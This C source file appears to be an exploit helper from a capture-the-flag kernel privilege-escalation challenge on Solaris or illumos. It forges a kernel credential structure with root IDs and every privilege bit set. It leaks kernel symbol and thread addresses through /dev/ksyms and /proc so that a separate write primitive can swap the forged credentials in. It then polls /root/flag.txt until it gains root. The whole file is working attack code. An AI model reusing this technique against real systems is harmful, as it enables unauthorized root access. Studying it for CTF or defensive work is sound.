#include <errno.h>
#include <fcntl.h>
#include <procfs.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/lwp.h>
#include <unistd.h>

typedef struct fake_cred {
    uint32_t cr_ref;
    uint32_t cr_uid;
    uint32_t cr_gid;
    uint32_t cr_ruid;
    uint32_t cr_rgid;
    uint32_t cr_suid;
    uint32_t cr_sgid;
    uint8_t cr_priv[0x34];
    int32_t cr_projid;
    uint32_t _pad;
    uint64_t cr_zone;
    uint64_t cr_label;
    uint64_t cr_klpd;
    uint64_t cr_ksid;
    uint64_t cr_grps;
} fake_cred_t;

static uint64_t leak_symbol_addr(const char *name) {
    FILE *fp; char cmd[256], buf[256];
    snprintf(cmd, sizeof(cmd), "/usr/bin/elfdump -s /dev/ksyms 2>/dev/null | /usr/bin/nawk '$NF==\"%s\" { print $2; exit }'", name);
    fp = popen(cmd, "r"); if (!fp) exit(1);
    if (!fgets(buf, sizeof(buf), fp)) exit(1);
    pclose(fp); return strtoull(buf, NULL, 16);
}
static uint64_t read_self_kthread(lwpid_t lwpid) {
    char path[128]; lwpsinfo_t info; int fd; ssize_t n;
    snprintf(path, sizeof(path), "/proc/%d/lwp/%d/lwpsinfo", getpid(), (int)lwpid);
    fd = open(path, O_RDONLY); if (fd < 0) exit(1);
    n = read(fd, &info, sizeof(info)); close(fd); if (n != sizeof(info)) exit(1);
    return (uint64_t)info.pr_addr;
}
int main(void) {
    fake_cred_t fc;
    memset(&fc, 0, sizeof(fc));
    fc.cr_ref = 0x100;
    fc.cr_uid = fc.cr_gid = fc.cr_ruid = fc.cr_rgid = fc.cr_suid = fc.cr_sgid = 0;
    memset(fc.cr_priv, 0xff, sizeof(fc.cr_priv));
    fc.cr_zone = leak_symbol_addr("zone0");
    printf("pid=%d kthread=0x%llx fake=0x%llx\n", getpid(), (unsigned long long)read_self_kthread(_lwp_self()), (unsigned long long)(uintptr_t)&fc);
    fflush(stdout);
    for (int i = 0; i < 20; i++) {
        int fd = open("/root/flag.txt", O_RDONLY);
        printf("try=%d euid=%d fd=%d errno=%d\n", i, geteuid(), fd, errno);
        fflush(stdout);
        if (fd >= 0) {
            char buf[128]; int n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("FLAG=%s\n", buf); fflush(stdout); }
            close(fd);
            break;
        }
        sleep(1);
    }
    sleep(5);
    return 0;
}
